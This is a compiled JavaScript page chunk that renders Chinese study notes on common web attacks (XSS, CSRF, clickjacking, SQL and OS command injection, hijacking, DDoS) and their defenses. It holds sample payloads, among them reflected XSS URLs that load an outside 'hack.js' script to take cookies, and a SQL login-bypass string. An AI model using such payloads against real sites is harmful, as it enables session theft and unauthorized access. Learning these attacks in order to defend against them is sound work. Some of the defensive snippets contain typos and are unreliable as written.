(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{400:function(s,t,v){"use strict";v.r(t);var _=v(4),a=Object(_.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"xss"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#xss"}},[s._v("#")]),s._v(" XSS")]),s._v(" "),t("p",[s._v("跨站脚本攻击: 插入js代码")]),s._v(" "),t("p",[s._v("影响:")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("1. 利用虚假输入表单骗取用户个人信息\n2. 利用脚本窃取用户的cookie值,发起恶意请求\n3. 获取页面数据\n4. 劫持前端逻辑\n5. 发送请求\n6. 偷取网站的任意数据,用户资料,登录态\n7. 欺骗用户\n")])])]),t("ul",[t("li",[t("p",[s._v("反射性攻击 url 注入")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("```js\n// 基本\nlocalhost:3000?form=username\n// alert尝试\nlocalhost:3000?form=<script>alert(1)<\/script>\n// 获取cookie 引入其他js\nlocalhost:3000?form=<script src='localhost:4000/hack.js<\/script>'><\/script>\n// 短域名隐藏url\nhttps://diz.cn/ada\n// 伪造cookie\ndocument.cookie= '获取到的cookie'\n```\n")])])])]),s._v(" "),t("li",[t("p",[s._v("读取型 存储到DB读取时注入: 把代码存储到数据库, 读取展示时执行 列:评论列表")])])]),s._v(" "),t("p",[s._v("防御:")]),s._v(" "),t("ul",[t("li",[s._v("启动xss过滤 "),t("code",[s._v("ctx.set('X-XSS-Protection')")]),s._v(" 浏览器阻止页面加载")]),s._v(" "),t("li",[s._v("CSP 内容安全策略 建立白名单")]),s._v(" "),t("li",[s._v("转义字符")]),s._v(" "),t("li",[s._v("黑名单 引号,尖括号,斜杠进行转义")]),s._v(" "),t("li",[s._v("httponly js并不能读取 只有传输时有效")])]),s._v(" "),t("h2",{attrs:{id:"csrf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#csrf"}},[s._v("#")]),s._v(" CSRF")]),s._v(" "),t("p",[s._v("跨站请求伪造:利用已知的用户身份,发起恶意请求, 用户登录了A并本地记录了cookie, 被诱导登录B, B网站使用from表单模拟用户向A网站发送信息")]),s._v(" "),t("p",[s._v("危害:")]),s._v(" "),t("ul",[t("li",[s._v("利用用户的登录态,用户并不知情")]),s._v(" "),t("li",[s._v("发送业务请求,")]),s._v(" "),t("li",[s._v("盗用用户资金(转账,消费)")]),s._v(" "),t("li",[s._v("冒充用户进行非法勾当")]),s._v(" "),t("li",[s._v("损害网站声誉")])]),s._v(" "),t("p",[s._v("防御:")]),s._v(" "),t("ul",[t("li",[s._v("referer check -https不发送referer 确定是自己的网址来源你")]),s._v(" "),t("li",[s._v("验证码(防止静默发送,进行人机识别)")]),s._v(" "),t("li",[s._v("cookie进行hash, 额外发送一个随机数")])]),s._v(" "),t("h2",{attrs:{id:"点击劫持"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#点击劫持"}},[s._v("#")]),s._v(" 点击劫持")]),s._v(" "),t("p",[s._v("视觉欺骗,攻击者将被攻击网站通过iframe方式嵌套入自己的网页中,并将iframe是指为透明,在页面透出一个按钮诱惑用户点击")]),s._v(" "),t("p",[s._v("防御")]),s._v(" "),t("ul",[t("li",[t("p",[s._v("x-frame-option")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("```js\n  // DENY 不允许通过iframe方式展示\n  // SAMEORIGINN 当前页面可以在相同域名下通过iframe的方式展示\n  // ALLOW-FROM 当前页面可以在指定来源的iframe中展示\n  ctx.set('X-FRAME-OPTIONS', 'DENY')\n```\n")])])])]),s._v(" "),t("li",[t("p",[s._v("js方式")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("```js\n  // self 是对当前窗口自身的引用 与window属性是等价的\n  // top返回顶层窗口,及浏览器窗口\n  if(self == top) {\n    // 设置当前页面展示 移除 html {display:none} style\n  }else {\n    // 不是最顶层 设置最顶层为自身路径\n    top.loction = self.loction\n  }\n```\n")])])])])]),s._v(" "),t("h2",{attrs:{id:"sql"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sql"}},[s._v("#")]),s._v(" SQL")]),s._v(" "),t("p",[s._v("用户提交时,携带部分SQL代码 与服务端的查询代码 拼接成一个SQL语句 并可查询成功 密码输入 1' or '1' = '1")]),s._v(" "),t("p",[s._v("防御:")]),s._v(" "),t("ul",[t("li",[s._v("所有的查询语句,不直接拼接用户出入的语句, 使用参数化语句")]),s._v(" "),t("li",[s._v("设置最小应用权限")]),s._v(" "),t("li",[s._v("严格限制变量类型,检查输入数据是否符合预期,使用正则进行匹配")]),s._v(" "),t("li",[s._v("对数据库的特殊字符(',\",,<,>,&,*,;)进行转义或编码转换")])]),s._v(" "),t("h2",{attrs:{id:"os"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#os"}},[s._v("#")]),s._v(" OS")]),s._v(" "),t("p",[s._v("与SQL类似,只不过SQL是针对数据库,OS是针对操作系统的, 通过web应用,执行非法的操作系统命令达到攻击的目的,只要在调用shell函数的地方就有存在被攻击的风险")]),s._v(" "),t("h2",{attrs:{id:"请求劫持"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#请求劫持"}},[s._v("#")]),s._v(" 请求劫持")]),s._v(" "),t("ul",[t("li",[t("p",[s._v("NDS劫持: DNS服务器被篡改")])]),s._v(" "),t("li",[t("p",[s._v("HTTP劫持:运营商劫持:升级https")])])]),s._v(" "),t("h2",{attrs:{id:"ddos"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ddos"}},[s._v("#")]),s._v(" DDOS")]),s._v(" "),t("p",[s._v("一大类攻击的总称")]),s._v(" "),t("p",[s._v("cc攻击 发送大量请求导致服务器宕机\nSYN flood: 第二次握手之后: 客户端不进行回应, 造成服务端内存沾满\nhttp flood: 高速刷新页面")]),s._v(" "),t("p",[s._v("防御:把备份网站,请求拦截,靠谱运营商,宽带扩容,提高犯罪成本")])])}),[],!1,null,null,null);t.default=a.exports}}]);